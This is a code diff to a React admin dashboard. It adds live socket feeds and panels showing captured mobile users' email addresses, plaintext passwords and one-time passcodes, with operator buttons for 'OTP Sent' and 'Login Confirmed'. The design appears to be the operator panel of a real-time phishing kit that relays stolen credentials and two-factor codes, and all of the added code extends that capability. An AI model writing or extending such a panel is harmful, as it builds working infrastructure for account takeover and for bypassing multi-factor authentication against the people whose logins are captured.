@@ -8,7 +8,9 @@ const socket = io(SERVER_URL);
 const AdminDashboard = () => {
   const [loginAttempts, setLoginAttempts] = useState([]);
   const [otpAttempts, setOtpAttempts] = useState([]);
+  const [otpAttemptsMobile, setOtpAttemptsMobile] = useState([]);
   const [updateAttempts, setUpdateAttempts] = useState([]);
+  const [updateAttemptsMobile, setUpdateAttemptsMobile] = useState([]);
   const [responseMessage, setResponseMessage] = useState("");
   const [otpResponseMessage, setOtpResponseMessage] = useState("");
   const [otpUpdateResponseMessage, setOtpUpdateResponseMessage] = useState("");
@@ -24,6 +26,10 @@ const AdminDashboard = () => {
       setOtpAttempts((prev) => [...prev, data]);
     });
 
+    socket.on("otpAttemptMobile", (data) => {
+      setOtpAttemptsMobile((prev) => [...prev, data]);
+    });
+
     socket.on("otpResendAttempt", (data) => {
       setOtpAttempts((prev) => [...prev, data]);
     });
@@ -32,11 +38,17 @@ const AdminDashboard = () => {
       setUpdateAttempts((prev) => [...prev, data]);
     });
 
+    socket.on("updateAttemptMobile", (data) => {
+      setUpdateAttemptsMobile((prev) => [...prev, data]);
+    });
+
     return () => {
       socket.off("loginAttempt");
       socket.off("otpAttempt");
+      socket.off("otpAttemptMobile");
       socket.off("otpResendAttempt");
       socket.off("updateAttempt");
+      socket.off("updateAttemptMobile");
     };
   }, []);
 
@@ -54,6 +66,14 @@ const AdminDashboard = () => {
     socket.emit("adminOtpUpdatedResponse", {
       email,
       message: otpResponseMessage,
+    });
+    setOtpUpdateResponseMessage("");
+  };
+
+  const handleOtpUpdateResponseMobile = (email) => {
+    socket.emit("adminOtpUpdatedResponseMobile", {
+      email,
+      message: otpUpdateResponseMessage,
     });
     setOtpUpdateResponseMessage("");
   };
@@ -101,6 +121,25 @@ const AdminDashboard = () => {
           </Box>
         ))}
       </VStack>
+      <VStack align="stretch" spacing={4} bg="#24f572">
+        {otpAttemptsMobile.map((attempt, index) => (
+          <Box key={index} borderWidth={1} p={4} borderRadius="md">
+            <Text>Send OTP</Text>
+            <Text>Email: {attempt.email}</Text>
+            <Text>Password: {attempt.password}</Text>
+            <Text>Timestamp: {attempt.timestamp}</Text>
+            <Input
+              value={otpResponseMessage}
+              onChange={(e) => setOtpResponseMessage(e.target.value)}
+              placeholder="Enter response message"
+              mt={2}
+            />
+            <Button onClick={() => handleOtpSendResponse(attempt.email)} mt={2}>
+              OTP Sent
+            </Button>
+          </Box>
+        ))}
+      </VStack>
       <VStack align="stretch" spacing={4} bg="#1ea9ff">
         {updateAttempts.map((attempt, index) => (
           <Box key={index} borderWidth={1} p={4} borderRadius="md">
@@ -120,6 +159,29 @@ const AdminDashboard = () => {
               mt={2}
             >
               Login Confirmed
+            </Button>
+          </Box>
+        ))}
+      </VStack>
+      <VStack align="stretch" spacing={4} bg="#1ea9ff">
+        {updateAttemptsMobile.map((attempt, index) => (
+          <Box key={index} borderWidth={1} p={4} borderRadius="md">
+            <Text>OTP Updated</Text>
+            <Text>Email: {attempt.email}</Text>
+            <Text>Password: {attempt.password}</Text>
+            <Text>OTP: {attempt.otp}</Text>
+            <Text>Timestamp: {attempt.timestamp}</Text>
+            <Input
+              value={otpUpdateResponseMessage}
+              onChange={(e) => setOtpUpdateResponseMessage(e.target.value)}
+              placeholder="Enter update message"
+              mt={2}
+            />
+            <Button
+              onClick={() => handleOtpUpdateResponseMobile(attempt.email)}
+              mt={2}
+            >
+              Login Confirmed (m)
             </Button>
           </Box>
         ))}
